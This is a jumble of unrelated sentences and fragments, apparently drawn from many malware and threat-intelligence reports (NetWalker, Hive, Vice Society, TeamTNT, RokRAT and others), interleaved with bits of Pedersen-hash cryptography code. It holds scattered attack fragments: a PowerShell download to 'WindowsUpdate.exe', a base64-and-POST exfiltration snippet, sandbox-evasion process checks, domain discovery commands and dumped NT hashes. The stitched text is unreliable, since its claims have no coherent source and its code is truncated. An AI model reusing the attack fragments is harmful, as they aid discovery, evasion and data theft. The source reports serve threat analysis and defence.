[42, 56]\nencoded_message = EncodeMessage(message, ZcashEncode)\nprint(f"Encoded Message: {encoded_message}")\n# Encoded Message:  
remove Removes the specified connector. 
/DOMAIN Privilege escalation In this campaign, we discovered several tools used for UAC bypass in Windows 10.
Write(“Запуск задачи EngineTask”); Scroll to view full table Fig 6 — Nemesis Start-up Code Nemesis then immediately proceeds with infostealing activities, and collects the following data in order: Chromium-based browsers: Steals stored credentials, cookies, credit cards, bookmarks, autofill data, and history. 
When using "vim” or another text editor, the .bat file appears to contain Chinese characters.
This method speeds up the brute forcing process significantly because it doesn’t have to go over a huge list of credentials. 
N/A Stage Capabilities [T1608] Obtain Capabilities
While most of these names are also present in version 5, this list is not a strict subset of the one v.5 uses.
REFERENCES 
Both backdoors are capable of exfiltrating files from a path specified in a command, but Dolphin also actively searches drives and automatically exfiltrates files with extensions of interest to ScarCruft. 
Detect: Process Analysis File Access Pattern Analysis
TLV ID Command purpose (inferred from the main Trojan) Implementation of command in the Post-Validator 0x8030A0 Retrieves the implant configuration. 
Comparing the sample we found to those described in that report, we conclude with strong confidence that it belongs to the same group.
Hard-coded credentials for brute forcing.
As seen in the product name identified in the malicious file’s properties, we searched for possible products named “i Talk” but did not find any that could be related to this investigation.
We will also zoom in and look at how the translation to the MITRE Techniques, historical context, and evidence artifacts like PlugX and Winnti malware led to a link with another campaign, which we highly trust to be executed by the same adversary. 
Since the generators are fixed (and known ahead of time), a method called windowed scalar multiplication can be used to more efficiently perform the multiplication by pre-computing and storing successive powers of the generators.\n
Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.
In campaign 1, the malware author used phishing emails to deliver malicious OneNote document either as attachment or a URL link to zip file containing the OneNote document.
107.148.45[.]32PEG TECH INC2023-01-0412-25.telegraem[.]org; C&C server. 
But all the other overlap is strong enough for us to consider it as one group right now.
This new version of the malware monitors user’s browsing data and replaces the content of popular Chinese sites with the fake homepage of 2345.com.
Initial Command and Control was conducted from "23[.]19[.]58[.]43"[zedorocop[.]com] and "23[.]106[.]160[.]141" [danimos[.]com].
We observed APT36 introducing OLE embedding to its typically used techniques for staging malware from lure documents and versioned changes to the implementation of Crimson RAT, indicating the ongoing evolution of APT36’s tactics and malware arsenal. 
/LogToConsole
The group did not devise attacks on companies of their choice; they simply worked with initial access to any corporate network they obtained elsewhere, since this was more profitable and saved time.
Fortinet Protections The FortiGuard Antivirus service detects and blocks this threat as ELF/Mirai, Linux/Mirai, and ELF/Gafgyt. 
The base64 string that follows fantasy35.exe is likely a relic of the execution requirements of Apostle (more details in the Attribution to Agrius section).
Let’s take a peek via macOS’s codesign and spctl utilities: 
Downloads a file from the given URL and executes it with the given arguments. 
The following prerequisites must be met in order for domain fronting to be possible: Own a domain.
[T1218.011] Template Injection [T1221] Execution Guardrails: Environmental Keying [T1480.001] Abuse Elevation Control Mechanism: Bypass User Access Control
;T1047 Windows Management
CONTROL_USER_RUNPE The control code that executes an executable using process hollowing. 
[T1087 - Account Discovery: Domain Account] Visited: <redacted>@file:///C:/ProgramData/AdComputers.csv Visited: <redacted>@file:///C:/ProgramData/AdSubnets.csv Visited: <redacted>@file:///C:/ProgramData/AdOUs.csv Visited: <redacted>@file:///C:/ProgramData/AdUsers.csv URL F[:]/IT/Backups/Database/LANSweeper%20SQL+Key/Encryption.txt The threat actor accessed the decryption key to facilitate gaining reconnaissance information without doing any noisy discovery scanning. 
Next, it loads this entire file to memory and starts its parsing task. 
As the first set of players, the main group is responsible for the deployments.
Deleting Volume Shadow Copies Disconnecting all network drives Unit
One of them – named GetMicInfo – contains an algorithm designed to gather database passwords by decrypting them from Windows registry values.
Defense EvasionT1055.002Process Injection: Portable Executable InjectionModPipe can inject it’s modules into various processes. 
In this blog we explore the various methods used to distribute SYS01 stealer. 
Cybersecurity awareness training, specifically educating users to be wary of fake shipment notifications, is an effective defense against these types of phishing attacks.
Conclusion\nWhile the Pedersen hash function has many desirable advantages due to its simplicity, efficiency in arithmetic circuits, and the known security assumption it relies on, it is also susceptible to many pitfalls.
These are more focused on the overall techniques or "odd" traffic that could be an indicator of compromise.
This information will provide organizations with detailed guidance on what they need to defend against to protect their businesses. 
From here on the adversary stops using the victim’s remote service to access the victim’s network, and starts using the Cobalt Strike beacon for remote access and command and control. 
We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems. 
Figure 38.
[T1484] Group Policy Modification
Mitigations FBI, CISA, and HHS recommend organizations, particularly in the HPH sector, implement the following to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Hive ransomware: 
Separate administrator accounts from user accounts [CPG 1.5].
Apache Status page – GlobeImposter victim portal. 
[T1078], compromised administrative [T1078.001] accounts Execution
IOC’s SHA256 : 55130719554a0b3dcbf971c646e6e668b663b796f4be09816d405cc15a16d7d6 C2 URL : hxxp[:]//lena[.]utf[.]by/wp-content/plugins/f8eb81f6deba45169c3b41c05c4590ad/y/mm/mmd/kdRrHFMqRUIujuOy126[.]bin Final Payload (Azorult stealer): d5af42b118d0597c6b71831f2b2ebc8294eca907481d53939563fce7c0f14767 REFERENCES 
Decryptor When a NetWalker victim goes through technical support (see an example of this below) and pays the ransom demanded by the group they will be able to download the decryptor to clean up their environment. 
Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft).
Malware uses combination of (PUSHFD/POPFD) instructions to set trap flag. 
The red team executed 13 measurable events designed to provoke a response from the people, processes, and technology defending the organization’s network.
In addition, the RokRAT LNK files drop batch files and downloads the payload that is decoded using the first byte as a key, then the payload is executed using Windows API functions (VirtualProtect).
[System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'WindowsUpdate.exe') $down.
IsDebuggerPresent By changing the return value for IsDebuggerPresent, one of the most critical APIs we put in breakpoint, we perform the anti-debugging bypass operation. 
This info stealer was likely meant to identify interesting targets for the operators. 
</Triggers> <Principals> <Principal id="Author"> <RunLevel>HighestAvailable</RunLevel> <UserId>[REDACTED]</UserId> <LogonType>InteractiveToken</LogonType> </Principal> </Principals> 
An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found here. 
Figure 7: Fake error message By analyzing the two different variants, we can see the implementation of this message box: Figure 8: Comparison between variants As we can see in the figure below, the function’s code is much longer compared to the actual DLL loading code.
For any inquiries about this service, visit the ESET Threat Intelligence page. 
There are two wiping methods, both of which zero out the selected file. 
A loop of intentional exception triggers to obfuscate control flow of program. 
Windows services ran with the highest privilege, NT AUTHORITY\SYSTEM and execute the malware automatically during system startup, allowing for remote access to the victim device with persistence. 
Once the shellcode is written to the named pipe, it is decrypted and executed in a separate thread. 
[T1484.001] Chinese state-sponsored cyber actors have also been observed modifying group policies for password exploitation. 
One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful.
0xDE 0xAD 0xBE 0xEF
A ZIP or self extracting archive (SFX) containing legitimate HTML webpages used as a decoy [A-Z]License (hidden).
Figure 16.
This script is executed by the Mach-O dropper before the I2P Dropper script, but its first step is to sit in a loop and wait for the creation of the /tmp/i2pd directory.
Mitigation: Perform regular vulnerability scanning to detect Log4J vulnerabilities and update Log4J software using vendor provided patches
Additionally, machine-learning and behavior-based protection reduces the attack surface against NetWalker and detects new exploitation attack techniques. 
List of used functions (with corresponding hashes). 
IndicatorTypeDescription9107be160f7b639d68fe3670de58ed254d81de6aec9a41ad58d91aa814a247ffDEV-1084 ransom payload8thCurse.exe80bd00c0f6d5e39b542ee6e9b67b1eef97b2dbc6ec6cae87bf5148f1cf18c260DEV-1084 batch script8dd9773c24703e803903e7a5faa088c2df9a4b509549e768f29276ef86ef96aeDEV-1084 batch script486eb80171c086f4d184423ed7e79303ad7276834e5e5529b199f8ae5fc661f2DEV-1084 batch scriptf1edff0fb16a64ac5a2ce64579d0d76920c37a0fd183d4c19219ca990f50effcDEV-1084 batch script887ae654d69ac5ccb8835e565a449d7716d6c4747dc2fbff1f59f11723244202DEV-1084 batch script3fba459d589cd513d2478fb4ae7c4efd6aa09e62bc3ff249a19f9a233e922061DEV-1084 batch script0dde13e3cd2dcda522eeb565b6374c97b3ed4aa6b8ed9ff9b6224ea97bf2a584DEV-1084 batch scriptafd16b9ad57eb9c26c8ae347c379c8e2b82361c7bdff5b189659674d5614854cDEV-1084 batch script3e59d36faf2d5e6edf1d881e2043a46055c63b7c68cc08d44cc7fc1b364157ebDEV-1084 batch script786bd97172ec0cef88f6ea08e3cb482fd15cf28ab22d37792e3a86fa3c27c975DEV-1084 batch script36c71ce7cd38733eb66f32a8c56acd635680197f01585c5a2a846cc3cb0a8fe2DEV-1084 batch script016967de76382c674b3a1cb912eb85ff642b2ebfe4e107fc576065f172c6ef80DEV-1084 batch script3059844c102595172bb7f644c9a70d77a198a11f1e84539792408b1f19954e18DEV-1084 batch script194.61.121[.]86Command and controlhxxps://pairing[.]rport[.]io/qMLc2WxDownload Rport software from it141.95.22[.]153Command and control193.200[.]16.3Command and control192.52.166[.]191Command and control45.56.162[.]111Command and control104.194.222[.]219Command and control192.169.6[.]88Command and control192.52.167[.]209Command and controlwebstore4tech[.]uaenorth.cloudapp.azure[.]comCommand and controlvatacloud[.]comActor-owned Rport domain146.70.106[.]89DEV-1084 operators were observed sending threatening emails to the victim after the attack from 146.70.106[.]89, an IP address previously linked to MERCURYb9cf785b81778e2b805752c7b839737416e3af54f64f1e40e008142e382df0c4Rport Legit remote access toolrport.exeab179112caadaf138241c43c4a4dccc2e3c67aeb96a151e432cfbafa18a4b436Customized Ligolo tunneling tool46.249.35[.]243Command and control45.86.230[.]20Command and control6485a68ba1d335d16a1d158976e0cbfad7ab15b51de00c381d240e8b0c479f77db.ps1 Customized Script Backdoorb155c5b3a8f4c89ba74c5c5c03d029e4202510d0cbb5e152995ab91e6809bcd7db.sqlite Customized Obfuscated Script Backdoor NOTE:
Figure 2.
If any feature is found, the code returns True, indicating the presence of virtualization. 
The following is an update of our original blog, more accurately aligned to the current intelligence community information regarding WatchDog’s mimicry of TeamTNT operations. 
IcedID initiates svchost.exe hooking.
Dynamic Resolution: Domain Generation Algorithms T1132 Data Encoding Persistence T1078
Interestingly, there is no clear segmentation of the targeting (by sector or geography) among the different teams. 
Just like the implants used in the 3CX campaign, Gopuram’s modules are DLL files that include an export function named DllGetClassObject.
The WinAPI CryptGenRandom is utilized to generate cryptographically random bytes used as a per-victim private key.
To broaden the compromise, they laterally move by leveraging in-built or deployed tools within the network. 
A list of affected models is available here. 
Consequently, these attacks pose major security concerns, especially in the domain environment if the attacker gains access to privileged credentials which can then be reused to access critical network resources.
In this post, we'll analyze the various TTPs used in a recent ransomware attack from Vice Society that leveraged this vulnerability.
For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, Guide to Malware Incident Prevention and Handling for Desktops and Laptops. 
Ensure storage of clear text passwords in LSASS memory is disabled.
As the main initial access vector of the attack was to obtain the admin’s credentials, we recommend organizations take the following steps to reduce their attack surface: Mitigate credential guessing attacks risks A key step in reducing the attack surface is securing the identity infrastructure.
Due to a feature that allows users to attach files to OneNote documents it makes them a good alternative to LNK files as distribution vehicle to deploy their malware.
This indicates that mim221 and these binaries may originate from the same source. 
Finally, another TeamTNT malware repository was identified by Unit 42 researchers, as shown in Figure 14.
Note that all three intermediate C2 servers are on third-level domains on a free hosting service.
For example, Trickbot injects the main bot into svchost.exe.
Dropper execution diagram (click to enlarge) 
It relies on two additional scripts to configure the I2P network tooling and download the XMRig mining software. 
For more information see Microsoft Security Advisory Update to Improve Credentials Protection and Management. Consider disabling or limiting NTLM and WDigest Authentication. 
As shown in Figure 1, the original WatchDog infrastructure, in the dark blue rectangle, has been commented out of the bash script functionality and replaced with the new infrastructure seen in the light blue rectangle. 
The threat actor chose CIDR block scanning as a way to get access to a wide range of target hosts on different IPs within a network instead of using a single IP address as a target. 
Organizations can protect themselves by remaining vigilant against phishing attacks.
An injected thread creates a named pipe inside a Windows process, and then another injected thread that lives inside a web browser attempts to connect to that same named pipe. 
This group’s choice of malware is PlugX, an older and well-known remote access tool.
Monitor processes for unexpected termination related to security tools/services [DS0009]. 
The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.
Before attempting to overwrite as much data as the wiper can it will delete key files in the partition, like MFT, $Bitmap, $LogFile, the NTUSER registry hive (T1112) and the event logs (T1070.001). 
Through the use of employment lures, these actors can target individuals and organizations across the cryptocurrency and Web 3 sphere.
Ongoing risk due to unwanted behavior within official firmware – Backdoors hidden within UEFI or other firmware can be hard to remove.
The AD.bat file had the following commands: for /f "delims="
This means even if ransomware finds its way onto a macOS system it won’t (easily) be able to mess with core OS files.
The calc.exe is a custom binary, not the Windows calc.exe.
On-premises attack flow Moving from on-premises to cloud To move from on-premises to the cloud, the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.
Figure 15 lists the files contained in two different NSIS installers.
Depending on how the code is delivered, the code can be injected into other legitimate running processes, bypassing defenses that do not scan legitimate processes or code in-memory. 
This product was written by CISA with contributions by the Federal Bureau of Investigation (FBI). 
}IndicatorsLEMURLOOT SamplesMD5 SHA256 00c6bce35c40ce1601aa06c4e808c0f1 38e69f4a6d2e81f28ed2dc6df0daf31e73ea365bd2cfc90ebc31441404cca264 04b474e8db353d368e2d791ba5dee6d6 3a977446ed70b02864ef8cfa3135d8b134c93ef868a4cc0aa5d3c2a74545725b 11eadcf3f1bc9b0ed6994c3ede299ce8 b1c299a9fe6076f370178de7b808f36135df16c4e438ef6453a39565ff2ec272 317552cac7035e35f7bdfc2162dfd29c c77438e8657518221613fbce451c664a75f05beea2184a3ae67f30ea71d34f37 359a1141a79480555aa996fd6d9e4af1 702421bcee1785d93271d311f0203da34cc936317e299575b06503945a6ea1e0 44d8e68c7c4e04ed3adacb5a88450552 387cee566aedbafa8c114ed1c6b98d8b9b65e9f178cf2f6ae2f5ac441082747a 45685c190c91ebe0966e8a0aeca31280 4359aead416b1b2df8ad9e53c497806403a2253b7e13c03317fc08ad3b0b95bf 538d6e172d18d4cebeac211873779ba5 daaa102d82550f97642887514093c98ccd51735e025995c2cc14718330a856f4 67fca3e84490dfdddf72e9ba558b589a 6015fed13c5510bbb89b0a5302c8b95a5b811982ff6de9930725c4630ec4011d 7d5e5537c5346d764f067f66cca426ba 9d1723777de67bc7e11678db800d2a32de3bcd6c40a629cd165e3f7bbace8ead 8cd6c75e6160b90de2a52c967b3d4846 c56bcb513248885673645ff1df44d3661a75cfacdce485535da898aa9ba320d4 8d88e451e39506ae258f3aa99da8db9a 0ea05169d111415903a1098110c34cdbbd390c23016cd4e179dd9ef507104495 911230b5dca1c43f6d22e65c66b0f6b1 d49cf23d83b2743c573ba383bf6f3c28da41ac5f745cde41ef8cd1344528c195 96d467fd9663cf2e5572f8529e54f13e 5b566de1aa4b2f79f579cdac6283b33e98fdc8c1cfa6211a787f8156848d67ff 9f3c306dabc3f349b343251f4443412c f0d85b65b9f6942c75271209138ab24a73da29a06bc6cc4faeddcb825058c09d a85299f78ab5dd05e7f0f11ecea165ea fe5f8388ccea7c548d587d1e2843921c038a9f4ddad3cb03f3aa8a45c29c6a2f b1bdad086567efd202babf56eac17e1d 9e89d9f045664996067a05610ea2b0ad4f7f502f73d84321fb07861348fdc24a b52e56bfc03878cc5cb9eae9d3896808 ea433739fb708f5d25c937925e499c8d2228bf245653ee89a6f3d26a5fd00b7a b69e23cd45c8ac71652737ef44e15a34 cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45 bf7c1dd613101c0a95027249a5fcb759 2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5 c2db1091eb7bac28461877f736d86d83 348e435196dd795e1ec31169bd111c7ec964e5a6ab525a562b17f10de0ab031d d71a6b5ae3d89dc33cbbb6877e493d52 b9a0baf82feb08e42fa6ca53e9ec379e79fbe8362a7dac6150eb39c2d33d94ad ddd95f1c76a1d50b997b2e64274f386a a1269294254e958e0e58fc0fe887ebbc4201d5c266557f09c3f37542bd6d53d7 e9a5f0c7656329ced63d4c8742da51b4 48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a eea4d43f9e3700ebcd61405776eb249a d477ec94e522b8d741f46b2c00291da05c72d21c359244ccb1c211c12b635899 fbba113d1d121220fa43f90b3a20870a 3ab73ea9aebf271e5f3ed701286701d0be688bf7ad4fb276cb4fbe35c8af8409 AcknowledgementsBeyond the listed authors are dozens of consultants and analysts who have already been working to help our clients with cases related to exploitation of CVE-2023-34362.
The FileData member of the FileDataStoreObject is the key member that holds the embedded data in the OneNote document.
Directory #1 and #2 can take the following names that are selected randomly: Directory #1 names Directory #2 names .cache .dbus .fontconfig .gconf .gnome .gnome2 .kde .local .qt .ssh .config .bin .sbin .etc .cfg .apps 
In both samples set to 0x65 (101) pk Public key found within the configuration uid Unique identifier calculated via CRC-32 hashing certain machine information sk Encoded session secret unm Username net Computer name grp Computer domain lng Computer locale bro Does keyboard locale match any hardcoded locale value – true/false os Product name bit System architecture dsk Disk information ext Ransomware extension Table 6.
Maintain up-to-date antivirus signatures and engines. 
Morphisec does this through Moving Target Defence, a technology that morphs process memory trapping crypters like Babadeda before they are able to deploy. 
Note that all memory addresses are passed in little-endian format. 
Naturally, if you are a website owner using this plugin and haven’t yet already, patch now!
Downloading, decrypting, and executing a backdoor payload from an attacker-controlled server.
Test your technologies against the technique. 
They then used remote services to execute Procdump, which was used to dump lsass.
With the protocol implementation, threat actor(s) might have to spend additional time attempting to modify and intercepting the web traffic. 
net group /domain
Figure 3.
It is also important to note that the third connection option, https://software-nas/Swhttp/LiveUpdate4 , is not a fully qualified domain name, but rather, a machine name that would presumably be on the local network.
587)
Once the victim opens the document, the embedded macro will be executed, injecting the shellcode into rundll32.exe.
This threat then uploads this information to an attacker-controlled machine via HTTP POST. 
TCP_HANDSHAKEFloods with TCP handshakes.
For whatever reason, there is an extraneous “1.bin” that is appended to a string which isn’t used.
Those two facts, rarities in the ransomware ecosystem, piqued CPR interest and prompted us to thoroughly analyze the newly discovered malware. 
During the COVID-19 pandemic, the adversaries behind NetWalker clearly stated that hospitals will not be targeted; whether they keep to their word remains to be seen. 
The string representing the name of the database is located at offset 0x28 of the response sent by the database server. 
Closer analysis confirms that the sample we pivoted to is a previous, less-advanced version of mim221 – Version 2.2.0 – that does not include some mim221 components, such as AddSecurityPackage64.dll and pc.dll.
Intezer Analyze endpoint scan result for Raindrop loading and executing a fileless Cobalt Strike payload Living off the Land (LotL) Living off the Land (LotL) is the attack process of using legitimate and signed tools, usually provided within the operating system, to execute malware.
Figure 4.
In our telemetry, we observed AvBugReport.exe, the executable hosting dll, to contain Gopuram’s main module payload, guard64.dll. 
Unlike traditional injection methods, which involve loading an external DLL or injecting code into the target process, reflective PE injection allows the malware to load and execute its code directly from memory. 
The icon, which doesn’t resemble the icon used by any known PDF reader application, looks like an icon for a plain text document wrapped in a red bar with the white letters PDF inside. 
cmd /c start %
Otherwise, we simply get an error from the Windows loader (as shown in Figure 1) and no additional information beyond what static analysis would buy us. 
ISO images can be mounted natively with a click of a button, displaying as a folder to the end user.
The NetWalker developers chose custom types by using 1337 or 31337 structs, so the resource format does not change.
It was attributed to Lazarus by CISA in December 2017.
The result is a memory-resident malware payload operating inside a legitimate Windows process.
The output is then parsed to the targeted process ID with the help of tasklist filters.
We can see that the required allocated space is relatively small, so it’s probably not called by the unpacking routine.
While Silence Group is known for targeting banks and financial institutions, TrueBot has also been seen targeting the education sector.
The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok. 
We can look for these system calls in the list of imported functions.
Aside from highlighting the technical details of this latest multi-staged attack, which includes several evasion techniques, this article also discusses some strange artifacts that make us think this could be a work-in-progress or part of a red-team exercise. 
Subsequent communication between the client and server occurs via protocol 1, except for when, at the beginning of the session, the client sends two packets with the FakeTLS header, which starts with the sequence 17 03 01.
Disable or Modify System Firewall Trigona operators open up an Remote Desktop Protocol (RDP) port in the firewall with DC4.exe. T1070.001.
As of the date of this publication, the certificate is no longer valid and has been revoked. 
Microsoft researchers identified numerous SSH and telnet connection attempts on default ports 22 and 23, as well as attempts to open ports and connect to them by port-knocking on ports 80, 8080, 8888, and 2323. 
systeminfo C:\Windows\system32\cmd.exe /C
Secure credentials by restricting where accounts and credentials can be used and by using local device credential protection features. 
On Windows, external dependencies are usually Dynamically Linked Libraries (DLLs) that contain additional functionality that can be imported into the process to execute. 
This is not the only example of a connection between the Crosswalk and ShadowPad network infrastructures.
[Procs] (T1021.005) WINDOWS ANALYTICS
Whoever crafted the messages has a good grasp of English-language euphemisms and tax-filing vernacular.
However, in the first attack wave targeting Albania, the threat actor signed the wave 1 wiper using the Kuwait Telecommunications Company certificate, thus removing the need for a third-party loader.
Given the fact that many of the domain names that the attackers registered for their websites are very similar to the legitimate domains, it is also possible that the attackers rely on typosquatting as well to attract potential victims to their websites.
Indicators of Compromise Threat actors have leveraged the following IOCs during Hive ransomware compromises.
The provided code includes two functions: fernet_decrypt and get_auth_token. 
BlackCat Config While analyzing the ransomware configurations, we observed numerous evasion tactics deployed.
Telemetry Using McAfee’s billion Insights sensors, we can show the global prevalence of the NetWalker ransomware. Figure 1.
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result)); $postParams = "result=$result"; } catch{}; }; 
Hex-Rays decompiled code of the function stealing database passwords The GetMicInfo module can intercept and decrypt these database passwords, using a specifically designed algorithm.
This suggests there was a relationship between the groups at some point, though it may not have been recent. 
Figure 13.
Notice the added “s” in posts:./wp-content/plugins/posts-layoutsSince the vulnerability allows for unauthenticated takeover of websites, attackers are able to take full administrator control of victim environments and install malicious plugins like the one above.
Use scheduled tasks and batch files for automation.
Summary of the files found in 3488164.iso (a detailed break down of these can be found in Execution): File Name Purpose 6570872.lnk LNK file that executes alsoOne.bat me/by Empty folder me/here Empty folder me/123.com Renamed legitimate version of rundll32.exe me/alsoOne.bat Batch script to run canWell.js with specific arguments me/canWell.js Reverses argument strings and executes tslt.db with 123.com me/itslt.db Ursnif DLL or.jpg Image not used. 
With these additional LNK files, the VBS downloaders do not perform these actions. 
["vmsrvc.exe", "vmusrvc.exe", "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmacthlp.exe", "vmtools.exe", "df5serv.exe"] running_processes = subprocess.check_output("tasklist", shell=True).decode().lower() 
From the previous code listing, we notice at the first line of the _loopstart routine that the pointer gets dereferenced into RAX, which in turn points to the first vfgadget.
The thieves could insert stolen card data into the transaction stream, while modifying the merchant and acquirer bank account on the fly. 
The zip file contains the following files: Annual Withdrawal.xlsx (SHA2: 59bb292565ebc86800e5e4d625d3c19f98afe2261d3da1a8e2f9b45ec76153a0) Robert tax_docs.pdf (SHA2: a9f4b054ea128529c62a8ff25f1439651f045e443adf5ff11fb5bd29f1333a7a) Figure 2.
Vice Society leak site including additional blog content (early November).The new “Our Partners” page takes the place of the main page from the previous incarnation of the leak site, including links to view leaked victim data. 
Incoming messages with an invalid signature are discarded. 
Examples of the tools discovered are PSexec, Procdump, and Mimikatz. 
During the encryption process, a file named *.key (previously *.key.
Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Snippet of Payload decryption function. 
Main function in svchast.exe 3t54dE3r.tmp The shellcode containing the main payload is the Crosswalk backdoor. 
This campaign did not support stopping or restarting the Telnet propagation, and while the samples support the same commands, their associated IDs did not match. 
An updated list of IOCs for this attack is published on our GitHub. 
Implement filters at the email gateway and block suspicious IP addresses at the firewall. 
(User Execution: Malicious Link [T1204.001], User Execution: Malicious File [T1204.002]).
[DOMAIN]\[USERNAME] -p
Static analysis can involve hashing the file and finding intel on it, taking a look at the strings to see if there are functionality or network indicators, or checking imports and running signatures such as YARA for the file.
Ads displayed if the victim enabled the notifications in the phishing page. 
These extensions are predominantly related to databases, but also include targeting of virtual memory and disk images.
There are more tools for debugging (and analyzing) .NET
Monitor and block network traffic to known malicious endpoints. 
Regularly change the credentials for accessing an NAS device.
This is a common technique used by threat actors, and implemented by the GetSystemCobalt Strike command.
Goodware String - occured 742 times */ $s19 = "Permission denied" fullword ascii /*
NormalAccount AdminCount: True Deleted: False LastLogonDate: 12/2/2021 1:41:46 PM DisplayName: TestUser GivenName: Test Surname: User Description: Admin Account ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-1432446722-301123485-1266542393-512 Secrets NTHash: 84a058676bb6d7de4237e18f09b91156 LMHash: NTHashHistory: Hash 01: 84a058676bb6d7de4237e18f09b91156 Hash 02: e047ebb3b7c463928c928fca95ac0ac8 Hash 03: 6dc3cdb3e559ef00d3521351ace7477e Hash 04: a88355849f35fe7336de23a4ca3e6a9e Hash 05: de9bde95677672295349aa6e1e857704 LMHashHistory: 
During the assessment, the team keylogged a user during a mandatory password change and noticed that only the final character of their password was modified.
During the initial detonation of 5898, the process imbedded itself into wermgr.exe, the Windows Error Reporting Manager (Process ID 6660). 
The encrypted payload, containing the main functionality of the dropper, is stored in the dropper’s resources as bitmaps named from A to L.
On March 31st
IRC Bot Deployment Upon successful login via phpMyAdmin service into the victim server, GoBruteforcer deploys and executes an IRC bot on the victim server.
The initial delivery method is conducted via a LNK file, which drops two Windows shortcut files containing obfuscated PowerShell scripts in charge of downloading a second stage RokRAT shellcode.
The malware incorporates multiple tactics to avoid detection and complicate reverse engineering, such as API hashing, string encryption, and irrelevant code. 
Final demands after negotiations were as high as $460,000. 
The DLL makes a connection to send and receive data to the address 137[.]184[.]67[.]33 that is fixed in the binary.
Thus, we believe that TA410 developers reused code copied from Farfli. 
All known samples are identified as malware. 
File Transfer Protocols
They later exploited CVE-2022-47986 in Aspera Faspex within five days of the POC being made public on February 2, 2023. 
The dropper then starts the malicious 32-bit driver that connects to the command and control (C2) hard-coded domains to download the specific 2345.com homepage configuration.
Normally, when we run into this situation and the OS loader refuses to execute our file, we are left with no data at all from dynamic analysis.
Persistence The Emotet malware has used various persistence methods over time, an example can be seen here. 
In a similar MSBuild project file to the Remcos dropping .proj file, we found another project file named “vwnfmo.lnk“ where RedLine Stealer was dropped instead of Remcos, shown in Figure 13 below.
Using this RMM agent they proceeded to install AnyDesk on the host.
Transparent Tribe’s constantly changing operational and targeting strategies require constant vigilance to mitigate the threat posed by the group. 
Perform integrity checks on critical servers to identify and investigate unexpected changes. 
[6] CISA Alert AA20-133A: Top 10 Routinely Exploited Vulnerabilities [7] CISA Alert AA20-206A: Threat Actor Exploitation of F5 BIG-IP CVE-2020-5902
The C2 might also respond with information about an additional C2 address to report to.
Figure 12 – C2 communication function. 
EarthWorm is a simple network tunnel tool with SOCKS v5 server and port transfer developed by a Chinese engineer.
Black Basta attack lifecycle based on Unit 42 incident response cases.
[TA0005] Table VII:
AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.
The data, however, is not copied identically from the section to the new memory region because the bytes containing 0x21 are omitted.
.wmv 
We reported the discovered package, named fshec2, to the PyPI security team on April 17, 2023, and it was removed from the PyPI repository the same day.
For Microsoft Cloud Solution Partners, there are only two substantial administrative options today when managing a customer’s environment, Admin agent or Helpdesk agent.2
So long as the results of check_timestamp are less than v6 (the timestamp value from manifest), the loop continues to sleep.
ds:00007ffb`eccd13a8=00007df600000000 0:000> ntdll!LdrpDispatchUserCallTarget+0x23: 00007ff8`7c5fc643 48ffe0 jmp rax {coop!OffSec::trigger (00000001`400186a0)} ... 
https://www.ddosi.org/one-fox/ (accessed Apr. 28, 2023). 
Check the Uniform Resource Identifier (URI) of the flow to see if it matches one associated with Cobalt Strike's malleable C2 language.
This PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%.
WDSync.dll embeds legitimate DLLs using the SmartAssembly feature Once a victim has executed one of the executables from the ZIP folder, a fake message box pops up and alerts the user to install a “framework” to open the file. 
HTTP_HANDLESends HTTP GET requests using a Golang standard library.
We will explain how the decryptor works and show some interactions between NetWalker’s operators and their victims.
However, they also made a mistake during this process within one incident.
i .r3
With 316 downloads during the last 7 days, you can hardly expect the number of active installations to increase so quickly.
The loaded shellcode is a self-decrypting DLL.
This cryptojacking operation introduces two new mining pools never before known to be used by TeamTNT actors, but have been witnessed within WatchDog operations.
Figure 5.
Quiet@ " fullword wide $s19 = "wrong comer?
ntds.dit Both ntdsutil and esentutl are by default installed on a domain controller. 
This ISO file contains a LNK named documents and a hidden directory named max containing a cobalt strike DLL beacon and a batch file. 
Let’s first inspect the C++ code of the object related to our vfgadget, and then explore its corresponding assembly from the compiled binary: class OffSec { public: char* a; int (*callback)(char* a); 
RESOURCES See CISA’s RedEye tool on CISA’s GitHub page.
Several events may be logged for such GPO modifications. 
Using Zcash’s encoding rules, hashing the message we’ve been using so far, and running our toy example implementation, we can proceed as follows:\n# ======================================= #\n#   Vulnerability 2 - Related Generators  #\n# ======================================= #\n\n#
Refer to the Base64 cheatsheet by Forian Roth here. 
For example, command No. 7 in Figure 5 provides a way to download files by their ID using the command: download/<int:file_id>, where file_id is an integer and the files in question are numbered in sequential order, starting from 1.
The investigation revealed that the threat actor launched credential stuffing attacks against high-risk accounts that didn’t have multi-factor authentication (MFA) enabled and leveraged the unsecured administrator accounts to gain initial access.
The ProcessWorm (its functionality is embedded into plugins) 
Spearphishing Attachment (T1193) Cryptojackers Exploit Critical Apache Struts Flaw (August 30, 2018) Security experts from Volexity have recently seen a critical Apache Strut vulnerability being exploited in the wild to install a popular cryptocurrency miner on targeted machines.
This body contains the exfiltrated information, which is highlighted in different colors for each field.
